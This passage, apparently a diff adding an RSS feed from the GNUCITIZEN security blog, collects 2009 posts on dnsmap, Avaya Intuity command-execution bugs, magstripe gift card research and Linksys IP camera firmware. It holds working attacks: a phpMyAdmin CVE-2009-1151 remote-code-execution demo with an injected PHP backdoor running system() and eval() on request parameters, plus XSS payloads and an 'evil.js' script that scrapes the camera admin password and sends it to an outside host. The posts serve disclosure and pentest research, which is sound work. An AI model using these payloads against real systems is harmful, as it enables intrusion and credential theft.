+<li>ignore IPs option (-i) added. This allows ignoring user-supplied IPs from the results. Useful for domains which cause dnsmap to produce false positives</li>
+<li>changes made to make dnsmap compatible with OpenDNS</li>
+<li>disclosure of internal IP addresses (RFC 1918) are reported</li>
+<li>updated built-in wordlist</li>
+<li>included a standalone three-letter acronym (TLA) subdomains wordlist</li>
+<li>domains susceptible to <a href="http://snipurl.com/etbcv">same site scripting</a> are reported</li>
+<li>completion time is now displayed to the user</li>
+<li>mechanism to attempt to bruteforce wildcard-enabled domains</li>
+<li>unique filename containing timestamp is now created when no specific output filename is supplied by user</li>
+<li>various minor bugs fixed</li>
+</ul>
+
+<p>For those who have never used dnsmap, dnsmap is a command line tool originally released in 2006 which helps discover target subdomains and IP ranges during the initial stages of an infrastructure pentest. dnsmap is a passive(ish) discovery tool meant to be used before an actual active attack. It&#8217;s an alternative to other discovery techniques such as whois lookups, scanning large IP ranges, etc &#8230; Run dnsmap and you should be able spot netblocks of a target organization in a relatively short period of time.</p>
+
+<blockquote>Dnsmap is open source and is known to work on Linux, FreeBSD and Windows using Cygwin, although it has mostly been tested on Linux.</blockquote>
+
+<p><em>The major drawback is lack of multi-threading support, which I&#8217;m hoping will be included in the next public release. Life is busy these days, but I&#8217;ll try to spend some time on this project when time allows and inspiration is available!</em></p><p>---<br/>recent posts from the gnucitizen network:</p><p><a href="http://blog.websecurify.com/2012/05/websecurify-websuite-incidents-php-cgi.html">Websecurify Websuite Incidents (PHP-CGI, CVE-2012-2311)</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-tutorial.html">Websuite Scanner Tutorial</a><br/><a href="http://blog.websecurify.com/2012/05/this-is-how-we-code.html">This is How We Code</a><br/><a href="http://blog.websecurify.com/2012/05/retro-websecurify-v04-video.html">Retro Websecurify (v0.4) Video</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-preview-video.html">Websuite Scanner Preview Video</a><br/></p>]]></content:encoded>
+			<wfw:commentRss>http://www.gnucitizen.org/blog/dnsmap-v030-is-now-out/feed/</wfw:commentRss>
+		<slash:comments>2</slash:comments>
+		</item>
+		<item>
+		<title>Old-school Remote Command Exec Vulnerabilities on Avaya Intuity</title>
+		<link>http://www.gnucitizen.org/blog/old-school-remote-command-execution-vulnerabilities-on-avaya-intuity-audix-lx/</link>
+		<comments>http://www.gnucitizen.org/blog/old-school-remote-command-execution-vulnerabilities-on-avaya-intuity-audix-lx/#comments</comments>
+		<pubDate>Thu, 17 Sep 2009 08:32:47 +0000</pubDate>
+		<dc:creator>pagvac</dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[avaya]]></category>
+		<category><![CDATA[command execution]]></category>
+		<category><![CDATA[intuity]]></category>
+		<category><![CDATA[vulnerability]]></category>
+
+		<guid isPermaLink="false">https://www.gnucitizen.org/?p=3316</guid>
+		<description><![CDATA[Remember those old remote command exec vulns where you had a CGI script such as a perl program which would take input from the client to construct command strings that would then be passed to the shell environment? Well, there were tons of those affecting diagnostic scripts available on the web interface of Avaya Intuity Audix LX.
+
+
+
+These vulnerabilities, although cool, are not critical since you need to be logged into the interface in order to exploit them. [...]]]></description>
+			<content:encoded><![CDATA[<p>Remember those old remote command exec vulns where you had a CGI script such as a perl program which would take input from the client to construct command strings that would then be passed to the shell environment? Well, there were tons of those affecting diagnostic scripts available on the web interface of Avaya Intuity Audix LX.</p>
+
+<blockquote>I successfully tested them on version 1.1, and according to Avaya this is the latest vulnerable version (version 2.0 is <em>NOT</em> affected apparently).</blockquote>
+
+<p>These vulnerabilities, although cool, are not critical since you need to be logged into the interface in order to exploit them. That being said, it could be handy for bypassing restricting imposed by the web GUI and eventually escalate privileges.</p>
+
+<p>Apart from that, there were also the usual client-side bugs such as XSS and CSRF which are usually expected of an appliance with a web interface.</p>
+
+<p><em>Details can be found on the attached <a href="http://www.gnucitizen.org/static/blog/2009/09/Avaya_Intuity_Remote_Command_Execution.pdf">PDF document</a>.</em></p><p>---<br/>recent posts from the gnucitizen network:</p><p><a href="http://blog.websecurify.com/2012/05/websecurify-websuite-incidents-php-cgi.html">Websecurify Websuite Incidents (PHP-CGI, CVE-2012-2311)</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-tutorial.html">Websuite Scanner Tutorial</a><br/><a href="http://blog.websecurify.com/2012/05/this-is-how-we-code.html">This is How We Code</a><br/><a href="http://blog.websecurify.com/2012/05/retro-websecurify-v04-video.html">Retro Websecurify (v0.4) Video</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-preview-video.html">Websuite Scanner Preview Video</a><br/></p>]]></content:encoded>
+			<wfw:commentRss>http://www.gnucitizen.org/blog/old-school-remote-command-execution-vulnerabilities-on-avaya-intuity-audix-lx/feed/</wfw:commentRss>
+		<slash:comments>1</slash:comments>
+		</item>
+		<item>
+		<title>Of Sec Cons and Magstripe Gift Cards</title>
+		<link>http://www.gnucitizen.org/blog/of-sec-cons-and-magstripe-gift-cards/</link>
+		<comments>http://www.gnucitizen.org/blog/of-sec-cons-and-magstripe-gift-cards/#comments</comments>
+		<pubDate>Wed, 22 Jul 2009 09:53:54 +0000</pubDate>
+		<dc:creator>pagvac</dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[conferences]]></category>
+		<category><![CDATA[CONFidence]]></category>
+		<category><![CDATA[eusecwest]]></category>
+		<category><![CDATA[gift card]]></category>
+		<category><![CDATA[krakow]]></category>
+		<category><![CDATA[london]]></category>
+		<category><![CDATA[magstripe]]></category>
+		<category><![CDATA[security]]></category>
+		<category><![CDATA[secwest]]></category>
+
+		<guid isPermaLink="false">https://www.gnucitizen.org/?p=3280</guid>
+		<description><![CDATA[I&#8217;ve been meaning to talk about CONFidence and EUSecWest for quite a while, but May was such an intense month for me, that&#8217;s hardly left me with any time for other things. I eventually got caught up with other matters, which resulted in me publishing this post about 2 months late.
+
+I&#8217;ve been researching, pentesting, and preparing two different presentations which I gave at CONFidence in Krakow, and EUSecWest in London. pdp has also been busy presenting at AusCERT2009. [...]]]></description>
+			<content:encoded><![CDATA[<p>I&#8217;ve been meaning to talk about <a href="http://2009.confidence.org.pl/lang-pref/en/">CONFidence</a> and <a href="http://eusecwest.com/">EUSecWest</a> for quite a while, but May was such an intense month for me, that&#8217;s hardly left me with any time for other things. I eventually got caught up with other matters, which resulted in me publishing this post about 2 months late.</p>
+
+<p>I&#8217;ve been researching, pentesting, and preparing two different presentations which I gave at <a href="http://2009.confidence.org.pl/prelegenci/adrian-pastor">CONFidence</a> in Krakow, and <a href="http://eusecwest.com/agenda.html">EUSecWest</a> in London. pdp has also been busy presenting at <a href="http://conference.auscert.org.au/conf2009/presenter.php?presenter_id=P_P">AusCERT2009</a>. In his Weaponry 2.0, pdp talked about current challenges experienced by pentesters, shared some of his experiments (i.e.: using QEMU) and introduced his <a href="http://www.gnucitizen.org/blog/jeriko-group-and-source-code-repository/">Jeriko</a> pentesting environment (NOT framework!).</p>
+
+<p>My CONFidence presentation was on PCI DSS, and credit card theft from a pentester&#8217;s perspective. I attempted to explain why it&#8217;s possible for unsophisticated criminals to compromise credit card data. I also shared my frustrations with the PCI DSS standards, including some of its current weaknesses.</p>
+
+<p>On the other hand, my EUSecWest presentation was on attacking magstripes gift cards, which apppear to be on the rise in the UK. The core of the research is about <em>cloning (activated) gift cards without physically swiping the magnetic stripes.</em> Trust me when I say that there is a lot of truth on <a href="http://twitter.com/dragosr/status/1949951235">Drago&#8217;s</a> tweet regarding this research! My EUSecWest slides have just been recently <a href="http://research.corsaire.com/presentations/">published</a>. More details will soon be available on a white paper which will be available on <a href="http://research.corsaire.com/">Corsaire Research</a> website.</p>
+
+<h3>Thanks</h3>
+
+<p>I&#8217;d like to thank the organizers of these two great conferences, namely Andrzej Targosz from CONFidence and <a href="http://twitter.com/dragosr">Dragos Ruiu</a> from EUSecWest (plus their respective crews of course).</p>
+
+<p>Also, special thanks to <a href="http://www.corsaire.com/">Corsaire</a> who sponsored the time needed to prepare my presentation. I originally started my magstripe gift cards research about 3 years ago, but left it unattended for so long. If it wasn&#8217;t for Corsaire, this research wouldn&#8217;t have been resumed.</p>
+
+<p><em>Finally, but not least, thanks to everyone who helped me prepare my presentations such as Jan Fry, Amir Azam, pavlovs_dog, Monsy Carlo, etc.</em></p><p>---<br/>recent posts from the gnucitizen network:</p><p><a href="http://blog.websecurify.com/2012/05/websecurify-websuite-incidents-php-cgi.html">Websecurify Websuite Incidents (PHP-CGI, CVE-2012-2311)</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-tutorial.html">Websuite Scanner Tutorial</a><br/><a href="http://blog.websecurify.com/2012/05/this-is-how-we-code.html">This is How We Code</a><br/><a href="http://blog.websecurify.com/2012/05/retro-websecurify-v04-video.html">Retro Websecurify (v0.4) Video</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-preview-video.html">Websuite Scanner Preview Video</a><br/></p>]]></content:encoded>
+			<wfw:commentRss>http://www.gnucitizen.org/blog/of-sec-cons-and-magstripe-gift-cards/feed/</wfw:commentRss>
+		<slash:comments>0</slash:comments>
+		</item>
+		<item>
+		<title>CVE-2009-1151: phpMyAdmin Remote Code Execution Proof of Concept</title>
+		<link>http://www.gnucitizen.org/blog/cve-2009-1151-phpmyadmin-remote-code-execution-proof-of-concept/</link>
+		<comments>http://www.gnucitizen.org/blog/cve-2009-1151-phpmyadmin-remote-code-execution-proof-of-concept/#comments</comments>
+		<pubDate>Tue, 09 Jun 2009 19:03:13 +0000</pubDate>
+		<dc:creator>pagvac</dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[CVE-2009-1151]]></category>
+		<category><![CDATA[exploit]]></category>
+		<category><![CDATA[phpMyAdmin]]></category>
+		<category><![CDATA[remote]]></category>
+
+		<guid isPermaLink="false">https://www.gnucitizen.org/?p=3254</guid>
+		<description><![CDATA[I couldn&#8217;t find any public PoC/exploit for this phpMyAdmin vulnerability, despite it being a serious bug affecting a popular open-source project. I think this vulnerability is a nice reminder that it&#8217;s still possible to perform remote command execution these days without relying on SQL injection (i.e.: xp_cmdshell) or a memory corruption bug (i.e.: heap overflow). [...]]]></description>
+			<content:encoded><![CDATA[<p>I couldn&#8217;t find any public PoC/exploit for this <a href="http://www.phpmyadmin.net/home_page/index.php">phpMyAdmin</a> vulnerability, despite it being a serious bug affecting a popular open-source project. I think this vulnerability is a nice reminder that it&#8217;s still possible to perform remote command execution these days without relying on SQL injection (i.e.: <code>xp_cmdshell</code>) or a memory corruption bug (i.e.: heap overflow).</p>
+
+<blockquote>All the documentation you need is in the script comments. I recommend you to go through it, before you actually run the script.</blockquote>
+
+<p>After reading the public <a href="http://www.phpmyadmin.net/home_page/security/PMASA-2009-3.php">advisory</a> and patched code, and playing around for a while, I managed to have a working PoC bash script. The script will allow you to remotely run shell commands and PHP code against vulnerable targets. Although in principle the vulnerability sounds quite simple, it actually took me a while to go from <a href="http://www.phpmyadmin.net/home_page/security/PMASA-2009-3.php">advisory</a> to working attack code.</p>
+
+<p><em>I&#8217;m providing the script with the hope that it will help pentesters and security researchers. Please only test the script against your own systems, or systems you have been given permission to pentest! Don&#8217;t be evil, it&#8217;s not worth it.</em></p>
+
+<h3>Demo</h3>
+
+<pre><code>$ ./phpMyAdminRCE.sh
+usage: ./phpMyAdminRCE.sh <phpMyAdmin_base_URL>
+i.e.: ./phpMyAdminRCE.sh http://target.tld/phpMyAdmin/
+
+$ ./phpMyAdminRCE.sh http://172.16.211.10/phpMyAdmin-3.0.1.1/
+[+] checking if phpMyAdmin exists on URL provided ...
+[+] phpMyAdmin cookie and form token received successfully. Good!
+[+] attempting to inject phpinfo() ...
+[+] success! phpinfo() injected successfully! output saved on /tmp/phpMyAdminRCE.sh.9217.phpinfo.flag.html
+[+] you *should* now be able to remotely run shell commands and PHP code using your browser. i.e.:
+
+http://172.16.211.10/phpMyAdmin-3.0.1.1//config/config.inc.php?c=ls+-l+/
+
+
+http://172.16.211.10/phpMyAdmin-3.0.1.1//config/config.inc.php?p=phpinfo();
+
+    please send any feedback/improvements for this script to unknown.pentester<AT_sign_goes_here>gmail.com
+
+$ curl "http://172.16.211.10/phpMyAdmin-3.0.1.1//config/config.inc.php?c=ls+-l+/"
+total 96
+drwxr-xr-x   2 root   root  4096 Mar 11 10:12 bin
+drwxr-xr-x   3 root   root  4096 May  6 10:01 boot
+lrwxrwxrwx   1 root   root    11 Oct 12  2008 cdrom -> media/cdrom
+drwxr-xr-x  15 root   root 14300 Jun  5 09:02 dev
+drwxr-xr-x 147 root   root 12288 Jun  5 09:02 etc
+drwxr-xr-x   3 root   root  4096 Oct 18  2008 home
+drwxr-xr-x   2 root   root  4096 Jul  2  2008 initrd
+<em>[partial output removed for brevity reasons]</em></code></pre>
+
+<p>Contents of <code>/config/config.inc.php</code> after our evil code has been successfully injected (injected code shown in <strong>bold</strong>):</p>
+
+<pre><code>&lt;?php
+/*
+ * Generated configuration file
+ * Generated by: phpMyAdmin 3.0.1.1 setup script by Michal ÄŒihaÅ™ &lt;michal@cihar.com&gt;
+ * Version: $Id: setup.php 11423 2008-07-24 17:26:05Z lem9 $
+ * Date: Tue, 09 Jun 2009 14:13:34 GMT
+ */
+
+/* Servers configuration */
+$i = 0;
+
+/* Server  (config:root) [1] */
+$i++;
+$cfg[&apos;Servers&apos;][$i][&apos;host&apos;]=&apos;<strong>&apos;; if($_GET[&apos;c&apos;]){echo
+&apos;&lt;pre&gt;&apos;;system($_GET[&apos;c&apos;]);echo &apos;&lt;/pre&gt;&apos;;}if($_GET[&apos;p&apos;]){echo
+&apos;&lt;pre&gt;&apos;;eval($_GET[&apos;p&apos;]);echo &apos;&lt;/pre&gt;&apos;;};//</strong>&apos;] = &apos;localhost&apos;;
+$cfg[&apos;Servers&apos;][$i][&apos;extension&apos;] = &apos;mysqli&apos;;
+$cfg[&apos;Servers&apos;][$i][&apos;connect_type&apos;] = &apos;tcp&apos;;
+$cfg[&apos;Servers&apos;][$i][&apos;compress&apos;] = false;
+$cfg[&apos;Servers&apos;][$i][&apos;auth_type&apos;] = &apos;config&apos;;
+$cfg[&apos;Servers&apos;][$i][&apos;user&apos;] = &apos;root&apos;;
+
+/* End of servers configuration */
+
+?&gt;</code></pre>
+
+<h3>Thanks</h3>
+
+<p><em>I&#8217;d like to thank <a href="http://labs.neohapsis.com/2009/04/06/about-cve-2009-1151/">Greg Ose</a> for discovering such a cool vuln and doing a nice writeup about the technical details! Also big thanks to <a href="http://www.milw0rm.com/">str0ke</a> for testing this PoC script and providing such useful feedback!</em></p><p>---<br/>recent posts from the gnucitizen network:</p><p><a href="http://blog.websecurify.com/2012/05/websecurify-websuite-incidents-php-cgi.html">Websecurify Websuite Incidents (PHP-CGI, CVE-2012-2311)</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-tutorial.html">Websuite Scanner Tutorial</a><br/><a href="http://blog.websecurify.com/2012/05/this-is-how-we-code.html">This is How We Code</a><br/><a href="http://blog.websecurify.com/2012/05/retro-websecurify-v04-video.html">Retro Websecurify (v0.4) Video</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-preview-video.html">Websuite Scanner Preview Video</a><br/></p>]]></content:encoded>
+			<wfw:commentRss>http://www.gnucitizen.org/blog/cve-2009-1151-phpmyadmin-remote-code-execution-proof-of-concept/feed/</wfw:commentRss>
+		<slash:comments>23</slash:comments>
+		</item>
+		<item>
+		<title>Hacking Linksys IP Cameras (pt 5)</title>
+		<link>http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-5/</link>
+		<comments>http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-5/#comments</comments>
+		<pubDate>Fri, 05 Jun 2009 08:04:55 +0000</pubDate>
+		<dc:creator>pagvac</dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[cameras]]></category>
+		<category><![CDATA[firmware]]></category>
+		<category><![CDATA[linksys]]></category>
+		<category><![CDATA[mount]]></category>
+
+		<guid isPermaLink="false">https://www.gnucitizen.org/?p=3229</guid>
+		<description><![CDATA[This article is a continuation of the following GNUCITIZEN articles: Hacking Linksys IP Cameras (pt 1), Hacking Linksys IP Cameras (pt 2), Hacking Linksys IP Cameras (pt 3), Hacking Linksys IP Cameras (pt 4).
+
+Mounting the filesystem on your workstation
+
+There are many ways to mount the camera&#8217;s filesystem using the firmware binary. In this post, we&#8217;ll explain one way to mount firmware version v1.00R24 which is the latest available for the WVC54GCA model. [...]]]></description>
+			<content:encoded><![CDATA[<p><em>This article is a continuation of the following GNUCITIZEN articles: <a href="http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-1/">Hacking Linksys IP Cameras (pt 1)</a>, <a href="http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-2/">Hacking Linksys IP Cameras (pt 2)</a>, <a href="http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-3/">Hacking Linksys IP Cameras (pt 3)</a>, <a href="http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-4/">Hacking Linksys IP Cameras (pt 4)</a>.</em></p>
+
+<h3>Mounting the filesystem on your workstation</h3>
+
+<p>There are many ways to mount the camera&#8217;s filesystem using the firmware binary. In this post, we&#8217;ll explain one way to mount firmware version v1.00R24 which is the latest available for the WVC54GCA model.</p>
+
+<p>If you were to only use the firmware binary, things could be a bit difficult, as you don&#8217;t know the format of the binary at all. However, having the GPL firmware helps a lot as we&#8217;ll see next. I emailed Linksys back on Apr 23, 2009 informing them that although the GPL firmware was available on their site for other Linksys products, they hadn&#8217;t uploaded the one for the WVC54GCA camera. A few days later, on Apr 27, 2009, Linksys kindly made it available and <a href="http://www.linksysbycisco.com/US/en/supportgplcode">has been available</a> ever since (the file to download is <code>wvc54gca_v1.00R24.tgz</code>).</p>
+
+<p>Thanks to <a href="http://brooknet.no-ip.com/~lex/">Lex Landa</a>&#8216;s tips I was able to figure out the parameters required to mount the firmware binary, by analysing the data contained in the <code>./scripts/wvc54gc_usa_english/combine.cfg</code> file which is included with the <a href="http://downloads.linksysbycisco.com/downloads/wvc54gca_v1.00R24,5.tgz">GPL firmware</a>:</p>
+
+<pre><code>size = 00400000
+file = WVC54GCA.bin
+f1_name = loader
+f1_start = 00000000
+f2_name=loader.ver
+f2_start=00007FFE
+f3_name=<strong>kernel</strong>
+f3_start=<strong>00020000</strong>
+f4_name=<strong>filesystem</strong>
+f4_start=<strong>000E0000</strong>
+f5_name=PID
+f5_start=003FFFB2</code></pre>
+
+<p>I simply focused on the <code>kernel</code> and <code>filesystem</code> parameters. The previous settings show that then kernel starts at <code>0x20000</code> (131072 bytes / 128 KB), and the filesystem starts at <code>0xE0000</code> (917504 bytes / 896 KB). In order to start <a href="http://en.wikipedia.org/wiki/Dd_(Unix)">dd</a> reading at <code>0xE0000</code>, we need to keep 7 chunks of 131072 bytes. i.e.:<code>7*131072=917504 bytes=0xE0000</code> (the position we want)</p>
+
+<pre><code>$ dd if=DYFF08-402-1024.bin bs=<strong>131072</strong> of=fs.img skip=<strong>7</strong>
+25+0 records in
+25+0 records out
+3276800 bytes (3.3 MB) copied, 0.019424 s, 169 MB/s</code></pre>
+
+<p>We then verify that our image file is a valid <code>squashfs</code> filesystem:</p>
+
+<pre><code>$ file fs.img 
+fs.img:<strong> Squashfs</strong> filesystem, little endian, version 3.0, 2216311 bytes, 475 inodes, blocksize: 65536 bytes, created: Fri Nov  9 03:58:52 2007</code></pre>
+
+<p>A finally mount it on our hardrive:</p>
+
+<pre><code>$ sudo mkdir /mnt/test
+$ sudo mount -t <strong>squashfs</strong> fs.img /mnt/test -o ro,loop
+$ ls /mnt/test/
+bin  dev  etc  lib  mnt  proc  root  sbin  tmp  usr  var</code></pre><p>---<br/>recent posts from the gnucitizen network:</p><p><a href="http://blog.websecurify.com/2012/05/websecurify-websuite-incidents-php-cgi.html">Websecurify Websuite Incidents (PHP-CGI, CVE-2012-2311)</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-tutorial.html">Websuite Scanner Tutorial</a><br/><a href="http://blog.websecurify.com/2012/05/this-is-how-we-code.html">This is How We Code</a><br/><a href="http://blog.websecurify.com/2012/05/retro-websecurify-v04-video.html">Retro Websecurify (v0.4) Video</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-preview-video.html">Websuite Scanner Preview Video</a><br/></p>]]></content:encoded>
+			<wfw:commentRss>http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-5/feed/</wfw:commentRss>
+		<slash:comments>17</slash:comments>
+		</item>
+		<item>
+		<title>Hacking Linksys IP Cameras (pt 4)</title>
+		<link>http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-4/</link>
+		<comments>http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-4/#comments</comments>
+		<pubDate>Sat, 25 Apr 2009 03:28:38 +0000</pubDate>
+		<dc:creator>pagvac</dc:creator>
+				<category><![CDATA[Blog]]></category>
+		<category><![CDATA[camera]]></category>
+		<category><![CDATA[linksys]]></category>
+		<category><![CDATA[vulnerability]]></category>
+
+		<guid isPermaLink="false">https://www.gnucitizen.org/?p=3070</guid>
+		<description><![CDATA[This article is a continuation of the following GNUCITIZEN articles, which include an introduction to the topic and also some initial observations: Hacking Linksys IP Cameras (pt 1), Hacking Linksys IP Cameras (pt 2), Hacking Linksys IP Cameras (pt 3).
+
+There are two types of vulnerabilities I will be releasing today: disclosure of credentials in client-side source code and multiple XSS. [...]]]></description>
+			<content:encoded><![CDATA[<p><em>This article is a continuation of the following GNUCITIZEN articles, which include an introduction to the topic and also some initial observations: <a href="http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-1/">Hacking Linksys IP Cameras (pt 1)</a>, <a href="http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-2/">Hacking Linksys IP Cameras (pt 2)</a>, <a href="http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-3/">Hacking Linksys IP Cameras (pt 3)</a>.</em></p>
+
+<p>There are two types of vulnerabilities I will be releasing today: disclosure of credentials in client-side source code and multiple XSS.</p>
+
+<h3>Disclosure of Credentials in Client-side Source Code</h3>
+
+<p>As a consumer of embedded products, I find highly frustrating to see how many devices&#8217; web interfaces return passwords back to the browser within HTML source code. I&#8217;ve also seen similar problems in some corporate appliances, but is not such as common problem within the enterprise realm.</p>
+
+<p>Visiting the change admin password page:</p>
+
+<pre><code>/adm/file.cgi?next_file=pass_wd.htm</code></pre>
+
+<p>Causes the current admin password to be returned (just view the source code with your browser):</p>
+
+<pre><code>&lt;input type=&quot;password&quot; size=&quot;8&quot; maxlength=&quot;64&quot; name=&quot;admpw&quot; value=&quot;<strong>C4mP4ssw0rd</strong>&quot; onKeyDown=&quot;chkPsize(this.value.length,64,msg_bigpw)&quot;&gt;</pre></code>
+
+<p>Visiting the "Wireless Security Page":</p>
+
+<pre><code>/adm/file.cgi?next_file=Wsecurity.htm</code></pre>
+
+<p>Causes the Wi-Fi WEP/WPA/WPA2 encryption key to be returned to the browser:</p>
+
+<pre><code>&lt;input type=&quot;text&quot; name=&quot;psk&quot; size=&quot;24&quot; maxlength=&quot;63&quot; value=&quot;<strong>mywirelesskey</strong>&quot;&gt;</code></pre>
+
+<p>Obviously this is bad news, as it means that every time the aforementioned pages are visited, credentials travel the clear (the WVC54GCA IP camera doesn't have SSL/TLS support).</p>
+
+<p>Now, I know there are people out there who might find these types of issues not worth fixing. The following is the thinking behind their reasoning.</p>
+
+<p>In the case of the admin password disclosure, some people would argue that this issue wouldn't make a difference security-wise, since the camera uses <a href="http://en.wikipedia.org/wiki/Basic_access_authentication">basic authentication</a> which transmits credentials in the clear (base64 encoding) anyway.</p>
+
+<p>In the case of the wireless encryption key disclosure, some individuals point out that if you can sniff the Wi-Fi encryption key, it means that either 1) you're already part of the wireless network which means you must already know the key, or 2) you are part of the network via an ethernet connection which means that you don't need the wireless key at all.</p>
+
+<p>So why fix these issues then? Well, think of client-side attacks for instance. If you keep reading I'll show you how you can (for instance) use XSS to steal the admin password from the aforementioned page. If the admin password wasn't returned by the web interface, this attack would not be possible, despite basic authentication being used by the camera.</p>
+
+<h3>Several XSS bugs</h3>
+
+<p>Yes, XSS is the roach of the Internet, it's everywhere and we can't seem to be able to get rid of it! Of course, Linksys IP cameras are no exception. Finding XSS vulns requires virtually no skills (unless you are trying to bypass a strict filter logic). Also, hunting for XSS vulns can be kind of boring. As pdp usually says, "it's not finding XSS bugs which is interesting, but what you can do with it". I couldn't agree more.</p>
+
+<p>Boring PoCs:</p>
+<pre><code>/main.cgi?next_file=%3Cimg%20src%3dx%20onerror%3dalert(1)%3E</code></pre>
+<pre><code>/img/main.cgi?next_file=%3Cimg%20src%3dx%20onerror%3dalert(1)%3E</code></pre>
+<pre><code>/adm/file.cgi?next_file=%3Cscript%3Ealert(1)%3C/script%3E</code></pre>
+<pre><code>/adm/file.cgi?todo=xss&#038;this_file=%3cscript%3ealert(1)%3c/script%3e</pre></code>
+
+<p>XSS bug #1 works regardless of the authentication state of the victim user. The rest do require the victim user to be logged-in for the injected JS to run within the context of the camera's domain sandbox.</p>
+
+<p>As you can see in the first two XSS vulns, we use <code>img</code> tags, rather then <code>script</code> tags, due to closing <code>script</code> tags being filtered. Once again, the developers have chosen to perform filtering against some parameters, albeit poor filtering.</p>
+
+<h4>Admin Password theft XSS PoC</h4>
+
+<p>The following is the PoC exploit which steals the admin user's password.</p>
+
+<pre><code>// <strong>evil.js</strong> : malicious JS file, typically located on attacker's site
+// payload description: steals Linksys WVC54GCA admin password via XSS
+// tested on FF3 and IE7
+// based on code from developer.apple.com
+function loadXMLDoc(url) {
+	req = false;
+    	// branch for native XMLHttpRequest object
+    	if(window.XMLHttpRequest &amp;&amp; !(window.ActiveXObject)) {
+    		try {	
+			req = new XMLHttpRequest();
+        	} 
+		catch(e) {
+			req = false;
+        	}
+    	} 
+    	// branch for IE/Windows ActiveX version	
+	else if(window.ActiveXObject) {
+       		try { 
+        		req = new ActiveXObject(&quot;Msxml2.XMLHTTP&quot;);
+      		} 
+		catch(e)  {
+        		try {
+          			req = new ActiveXObject(&quot;Microsoft.XMLHTTP&quot;);
+        		} 
+			catch(e) {
+          			req = false;
+        		}
+		}
+    	}
+	if(req) {
+		req.onreadystatechange = processReqChange;
+		req.open(&quot;GET&quot;, url, true);
+		req.send(&quot;&quot;);
+	}
+}
+// end of loadXMLDoc(url)
+
+function processReqChange() {
+   	// only if req shows &quot;loaded&quot;
+    	if (req.readyState == 4) {
+        	// only if &quot;OK&quot;
+        	if (req.status == 200) { 
+			// dirty credentials-scraping code
+			var bits=req.responseText.split(/\&quot;/);	
+			var gems=&quot;&quot;;
+			for (i=0;i&lt;bits.length;++i) { 
+                                if(bits[i]==&quot;adm&quot; &amp;&amp; bits[i+1]==&quot; value=&quot;) {      
+                               		gems+=&quot;login=&quot;; 
+					gems+=bits[i+2];
+                                }
+                                if(bits[i]==&quot;admpw&quot; &amp;&amp; bits[i+1]==&quot; value=&quot;) {      
+                                       	gems+=&apos;&amp;password=&apos;; 
+					gems+=bits[i+2];    
+                                }
+			}
+			alert(gems); // this line is for demo purposes only and would be removed in a real attack
+			c=new Image();
+			c.src=&apos;http://google.com/x.php?&apos;+gems; // URL should point to data-theft script on attacker&apos;s site
+        	} 
+    	}
+}
+
+var url=&quot;/adm/file.cgi?next_file=pass_wd.htm&quot;;
+loadXMLDoc(url);</code></pre>
+
+<pre><code>http://192.168.1.115/adm/file.cgi?next_file=%3cscript%20src=http://evil.foo/<strong>evil.js</strong>%3e%3c/script%3e</code></pre>
+
+<p>If you capture the traffic while testing the exploit against yourself you will see the admin login and password being sent to google.com:</p>
+
+<div class="screen"><img src="http://www.gnucitizen.org/static/blog/2009/04/screenshot-eth1-capturing-wireshark1.png" alt="Screenshot eth1 Capturing Wireshark 1" title="Screenshot eth1 Capturing Wireshark 1" width="505" height="189" class="alignnone size-full wp-image-3100" /></div>
+
+<h4>Attack Requirements</h4>
+
+<p>In order for this exploit to work, the camera admin user must be logged in when the attack occurs. This means that a bit of social engineering is required. For instance, the attacker could setup a forum to help users of the WVC54GCA camera by providing tips, FAQs, etc. If the attacker is serious he could use <a href="http://www.timesonline.co.uk/tol/driving/article754974.ece">black hat SEO</a> and ad campaigns such as Google AdWords to attract Linksys camera users to visit the site containing the malicious XSS URLs. You get the idea!</p>
+
+<h3>Testing Info</h3>
+
+<p>All Disclosure of Credentials and XSS vulnerabilities successfully tested on:</p>
+<ul>
+<li>WVC54GCA</li>
+<li>Firmware V1.00R22 and V1.00R24 (latest available as on 23rd April 2009)</li>
+</ul><p>---<br/>recent posts from the gnucitizen network:</p><p><a href="http://blog.websecurify.com/2012/05/websecurify-websuite-incidents-php-cgi.html">Websecurify Websuite Incidents (PHP-CGI, CVE-2012-2311)</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-tutorial.html">Websuite Scanner Tutorial</a><br/><a href="http://blog.websecurify.com/2012/05/this-is-how-we-code.html">This is How We Code</a><br/><a href="http://blog.websecurify.com/2012/05/retro-websecurify-v04-video.html">Retro Websecurify (v0.4) Video</a><br/><a href="http://blog.websecurify.com/2012/05/websuite-scanner-preview-video.html">Websuite Scanner Preview Video</a><br/></p>]]></content:encoded>
+			<wfw:commentRss>http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-4/feed/</wfw:commentRss>
+		<slash:comments>7</slash:comments>
+		</item>
+		<item>
+		<title>Hacking Linksys IP Cameras (pt 3)</title>
+		<link>http://www.gnucitizen.org/blog/hacking-linksys-ip-cameras-pt-3/</link>
